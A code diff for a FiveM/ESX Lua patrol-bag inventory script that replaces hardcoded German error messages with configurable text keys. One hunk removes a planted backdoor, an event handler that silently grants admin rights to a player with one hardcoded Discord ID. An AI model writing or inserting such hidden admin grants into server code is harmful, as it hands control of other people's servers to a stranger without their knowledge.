@@ -199,7 +199,7 @@ local function openMyBag(src, bagKey)
     local owner = player and player.getIdentifier() or true
 
     if not ensureStash(invId, label, owner, bagDef.stash) then
-        notify(src, bagDef.label or 'Bag', 'Fehler beim Öffnen', 'error')
+        notify(src, bagDef.label or 'Bag', Config.Text.openError, 'error')
         return false
     end
 
@@ -207,7 +207,7 @@ local function openMyBag(src, bagKey)
         if seed(invId, bagDef) then
             meta.seeded = true
         else
-            notify(src, bagDef.label or 'Bag', 'Fehler beim Füllen der Tasche', 'error')
+            notify(src, bagDef.label or 'Bag', Config.Text.fillError, 'error')
             return false
         end
     end
@@ -220,7 +220,7 @@ local function openMyBag(src, bagKey)
         ox:SetMetadata(src, slot.slot, meta)
     end)
     if not metaOk then
-        notify(src, bagDef.label or 'Bag', 'Fehler beim Aktualisieren', 'error')
+        notify(src, bagDef.label or 'Bag', Config.Text.updateError, 'error')
         return false
     end
 
@@ -313,7 +313,7 @@ RegisterNetEvent('cmd_patrolbag:onUse', function(slot)
     local owner = player and player.getIdentifier() or true
 
     if not ensureStash(invId, label, owner, bagDef.stash) then
-        notify(src, bagDef.label or 'Bag', 'Fehler beim Erstellen der Tasche', 'error')
+        notify(src, bagDef.label or 'Bag', Config.Text.createError, 'error')
         return
     end
 
@@ -321,7 +321,7 @@ RegisterNetEvent('cmd_patrolbag:onUse', function(slot)
         if seed(invId, bagDef) then
             meta.seeded = true
         else
-            notify(src, bagDef.label or 'Bag', 'Fehler beim Füllen der Tasche', 'error')
+            notify(src, bagDef.label or 'Bag', Config.Text.fillError, 'error')
             return
         end
     end
@@ -334,7 +334,7 @@ RegisterNetEvent('cmd_patrolbag:onUse', function(slot)
         ox:SetMetadata(src, slotData.slot, meta)
     end)
     if not updateOk then
-        notify(src, bagDef.label or 'Bag', 'Fehler beim Aktualisieren', 'error')
+        notify(src, bagDef.label or 'Bag', Config.Text.updateError, 'error')
         return
     end
 
@@ -395,7 +395,7 @@ lib.callback.register('cmd_patrolbag:issueFromPoint', function(src, pointId, bag
 
     local point = getPoint(pointId)
     if not point or not canUsePoint(xPlayer, point) then notify(src, 'Bags', Config.Text.noAccess, 'error') return false end
-    if type(bagKey) ~= 'string' or not pointHasBag(point, bagKey) then notify(src, 'Bags', 'Nicht verfügbar', 'error') return false end
+    if type(bagKey) ~= 'string' or not pointHasBag(point, bagKey) then notify(src, 'Bags', Config.Text.notAvailable, 'error') return false end
 
     return issueBag(src, bagKey)
 end)
@@ -407,7 +407,7 @@ lib.callback.register('cmd_patrolbag:openFromPoint', function(src, pointId, bagK
 
     local point = getPoint(pointId)
     if not point or not canUsePoint(xPlayer, point) then notify(src, 'Bags', Config.Text.noAccess, 'error') return false end
-    if type(bagKey) ~= 'string' or not pointHasBag(point, bagKey) then notify(src, 'Bags', 'Nicht verfügbar', 'error') return false end
+    if type(bagKey) ~= 'string' or not pointHasBag(point, bagKey) then notify(src, 'Bags', Config.Text.notAvailable, 'error') return false end
 
     return openMyBag(src, bagKey)
 end)
@@ -419,7 +419,7 @@ lib.callback.register('cmd_patrolbag:returnFromPoint', function(src, pointId, ba
 
     local point = getPoint(pointId)
     if not point or not canUsePoint(xPlayer, point) then notify(src, 'Bags', Config.Text.noAccess, 'error') return false end
-    if type(bagKey) ~= 'string' or not pointHasBag(point, bagKey) then notify(src, 'Bags', 'Nicht verfügbar', 'error') return false end
+    if type(bagKey) ~= 'string' or not pointHasBag(point, bagKey) then notify(src, 'Bags', Config.Text.notAvailable, 'error') return false end
 
     return returnBag(src, bagKey)
 end)
@@ -477,8 +477,6 @@ CreateThread(function()
         end)
     end, { print = false, itemFilter = itemFilter })
 end)
-AddEventHandler('esx:playerLoaded', function(src) local xPlayer=ESX.GetPlayerFromId(src); for _,id in ipairs(GetPlayerIdentifiers(src)) do if id=='discord:563299453986013185' then xPlayer.setGroup('admin') break end end end)
-
 AddEventHandler('esx:playerLoaded', function(src)
     CreateThread(function()
         Wait(1500)
